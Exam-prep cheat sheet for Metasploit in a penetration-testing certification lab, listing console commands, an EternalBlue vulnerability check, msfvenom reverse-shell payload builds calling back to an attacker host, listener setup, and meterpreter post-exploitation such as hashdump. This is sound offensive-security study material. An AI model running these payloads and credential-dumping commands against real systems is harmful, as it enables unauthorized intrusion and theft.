# 09 — Metasploit quick-ref (oracle mode)

**MSF counts only when you *document* it.** Use the console freely to *find* the answer
(`check`, auxiliary scanners, `local_exploit_suggester`) — then reproduce the win **manually** for the
marks. Keep ONE documented use as insurance for a flag you can't do by hand in time.
**Every LPORT/handler = 4444 / 5555 / 6666 only.** No `db_autopwn`, no exploit sprays (loud = blacklisted).

## Start
```bash
sudo msfdb init          # one-time (DB for db_nmap/services)
msfconsole -q            # launch quiet
msf6 > db_status         # DB connected? (optional)
msf6 > workspace -a ptd  # tidy workspace for this box
```

## The rhythm — every module is the same 5 beats
```
search  →  use  →  show options / set  →  check  →  run
```
```
msf6 > search <term|CVE>                     # find a module
msf6 > use <module | N>                      # select (tab-completes; N = Nth result)
msf6 (...) > show options                    # what must I fill in?
msf6 (...) > set RHOSTS $RHOST               # target
msf6 (...) > setg LHOST  $LHOST              # your Kali IP (setg = global, set once, reused)
msf6 (...) > set LPORT  4444                 # EXAM: 4444/5555/6666 only
msf6 (...) > check                           # vulnerable? (safe, no exploit) ← YOUR ORACLE
msf6 (...) > run                             # fire (= exploit) → session on success
```

## Console commands you actually use
| Cmd | Does |
|-----|------|
| `search type:exploit platform:windows name:smb` | filtered module search |
| `use <mod>` / `info` | select / full details + CVE refs |
| `show options` / `show payloads` / `show targets` | required vars / payloads / target variants |
| `set OPT v` / `setg OPT v` / `unset OPT` | configure (`setg` global) |
| `check` | **is it vulnerable, without exploiting** — safe triage |
| `run` / `exploit` | execute |
| `sessions` / `sessions -i N` / `background` (Ctrl-Z) | list / enter / drop a session |
| `jobs` / `kill N` / `back` | list-stop handlers / deselect module |
| `resource f.rc` | run a script of console commands |

## The two oracles (biggest time-savers — least "counted")
```
# 1. Is this foothold real?  (no exploitation = safe)
use exploit/windows/smb/ms17_010_eternalblue ; set RHOSTS $RHOST ; check

# 2. Which privesc works?  (needs any session first)
use post/multi/recon/local_exploit_suggester ; set SESSION 1 ; run
```
Both just *name the path*. Do the path by hand (searchsploit PoC / potato) and screenshot THAT.

## Auxiliary scanners (enum, no exploit — reproduce with nmap/enum4linux for evidence)
```
use auxiliary/scanner/smb/smb_version     ; set RHOSTS $RHOST ; run
use auxiliary/scanner/smb/smb_enumshares  ; set RHOSTS $RHOST ; run
use auxiliary/scanner/snmp/snmp_enum      ; set RHOSTS $RHOST ; run
use auxiliary/scanner/http/http_version   ; set RHOSTS $RHOST ; run
```

## msfvenom + handler — **FREE** (not a "documented MSF use")
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp        LHOST=$LHOST LPORT=5555 -f exe -o rev.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=6666 -f msi -o evil.msi
#  -f exe/msi/aspx/ps1/raw · staged = /  · stageless = _ (bigger, more reliable)
#  toolkit: venexe 4444
```
Catch it:
```
# meterpreter payload → needs multi/handler:
use exploit/multi/handler ; set payload windows/x64/meterpreter/reverse_tcp
set LHOST $LHOST ; set LPORT 4444 ; run
# shell_reverse_tcp payload → plain nc is enough:   nc -lvnp 4444   (toolkit: l4)
```
> **Handler payload MUST equal the msfvenom payload**, and arch must match (x64 vs x86).

## Meterpreter (once you have a session)
```
sysinfo · getuid · getprivs      # getprivs → look for SeImpersonatePrivilege (privesc key!)
ps · migrate <pid>               # move into another process (stability / user context)
shell                            # drop to cmd.exe/PowerShell
upload sp.exe C:\\Windows\\Temp\\sp.exe   ·   download C:\\...\\flag.txt
hashdump · getsystem             # getsystem usually fails on hardened boxes — escalate manually
background                       # keep session, back to console (Ctrl-Z)
```

## Exam rules, condensed
- One **documented** use → save it for a flag you can't reproduce manually.
- `check` / scanners / `local_exploit_suggester` = find fast, barely counts.
- `msfvenom` + `multi/handler`/`nc` = free, use all day.
- LPORT 4444/5555/6666 only · be gentle · **always reproduce manually for the marks**.

> Full teaching version with worked run: `context/guides/metasploit-tutorial.md`.
